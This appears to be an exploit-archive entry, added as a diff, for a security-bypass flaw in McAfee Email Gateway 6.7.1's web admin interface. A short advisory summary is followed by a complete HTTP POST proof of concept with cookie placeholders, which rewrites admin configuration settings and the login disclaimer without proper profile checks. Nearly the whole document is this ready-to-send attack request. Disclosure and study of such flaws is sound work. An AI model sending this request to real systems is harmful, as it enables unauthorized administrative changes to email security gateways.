@@ -1,0 +1,61 @@
+source: http://www.securityfocus.com/bid/40255/info
+
+McAfee Email Gateway is prone to a security-bypass vulnerability because the web-based interface fails to properly perform user-profile checks.
+
+Attackers can exploit this issue to bypass certain security restrictions to edit property and configuration settings.
+
+McAfee Email Gateway 6.7.1 is vulnerable; other versions may also be affected.
+
+POST /admin/systemWebAdminConfig.do?method=save&pageId=13&isMenuToggled=1 HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash,
+application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/xaml+xml,
+application/vnd.ms-xpsdocument, application/x-ms-xbap, application/x-ms-application, */*
+Referer:
+https://www.example.com:XXXXX/admin/systemWebAdminConfig.do?method=init&isMenuTog
+gled=1&pageId=13
+Accept-Language: es
+Content-Type: application/x-www-form-urlencoded
+UA-CPU: x86
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR
+3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+Host: www.example.com:XXXXX
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie:CTRGT=[YOUR COOKIE HERE]; CTSecureToken=[YOUR COOKIE HERE];
+tabbedMenuSelected=13;
+itemToHighlight=https%3A//www.example.com%3AXXXXX/admin/systemWebAdminConfig.do
+%3Fmethod%3Dinit%26isMenuToggled%3D1%26pageId%3D13;
+menusToExpand=ConfigurationMenu%2CCertificateManagementMenu%2CWebAdminConfiguration
+Menu%2C; JSESSIONID=[YOUR COOKIE HERE]
+Content-Length: 2650
+pageId=13&vipId=0&vipBased=0&rows%5B0%5D.attr_name=gui_log_level&rows%5B0%5D.attr_ty
+pe=12&rows%5B0%5D.attr_validate=30060003%3A1%2C30060004%3A4%2C30060005%3A5%2C
+30060006%3A6&rows%5B0%5D.attr_validate_str=30060003%3A1%2C30060004%3A4%2C300600
+05%3A5%2C30060006%3A6&rows%5B0%5D.attr_depends=&rows%5B0%5D.is_mult_val=0&rows
+%5B0%5D.lang_tag_id_dv=2000003.displayValue&rows%5B0%5D.is_ascii_only=0&rows%5B0%5
+D.proc_id=90&rows%5B0%5D.attr_value_clone=4&rows%5B0%5D.attr_value=4&rows%5B1%5D.a
+ttr_name=gui_timeout&rows%5B1%5D.attr_type=2&rows%5B1%5D.attr_validate=%5B1-
+30%5D&rows%5B1%5D.attr_validate_str=%5B1-
+30%5D&rows%5B1%5D.attr_depends=&rows%5B1%5D.is_mult_val=0&rows%5B1%5D.lang_tag_i
+d_dv=2001014.displayValue&rows%5B1%5D.is_ascii_only=0&rows%5B1%5D.proc_id=90&rows%5
+B1%5D.attr_value_clone=30&rows%5B1%5D.attr_value=30&rows%5B2%5D.attr_name=auto_refres
+h&rows%5B2%5D.attr_type=2&rows%5B2%5D.attr_validate=%5B1-
+30%5D&rows%5B2%5D.attr_validate_str=%5B1-
+30%5D&rows%5B2%5D.attr_depends=&rows%5B2%5D.is_mult_val=0&rows%5B2%5D.lang_tag_i
+d_dv=2001017.displayValue&rows%5B2%5D.is_ascii_only=0&rows%5B2%5D.proc_id=90&rows%5
+B2%5D.attr_value_clone=10&rows%5B2%5D.attr_value=10&rows%5B3%5D.attr_name=enable_logi
+n_disclaimer_text&rows%5B3%5D.attr_type=5&rows%5B3%5D.attr_validate=&rows%5B3%5D.attr
+_validate_str=&rows%5B3%5D.attr_depends=&rows%5B3%5D.is_mult_val=0&rows%5B3%5D.lang
+_tag_id_dv=2001044.displayValue&rows%5B3%5D.is_ascii_only=0&rows%5B3%5D.proc_id=90&r
+ows%5B3%5D.attr_value_clone=true&rows%5B3%5D.attr_value=true&rows%5B4%5D.attr_name=l
+ogin_disclaimer_text&rows%5B4%5D.attr_type=19&rows%5B4%5D.attr_validate=&rows%5B4%5D
+.attr_validate_str=&rows%5B4%5D.attr_depends=enable_login_disclaimer_text&rows%5B4%5D.is_
+mult_val=0&rows%5B4%5D.lang_tag_id_dv=2001045.displayValue&rows%5B4%5D.is_ascii_only=
+0&rows%5B4%5D.proc_id=90&rows%5B4%5D.attr_value_clone=****************************
+***************************%0D%0A%22NEW
+DISCLAIMER.%22%0D%0A*******************************************************&ro
+ws%5B4%5D.attr_value=*******************************************************%0D%0
+A%22NEW
+DISCLAIMER.%22%0D%0A*******************************************************&su
+bmitValue=Submit
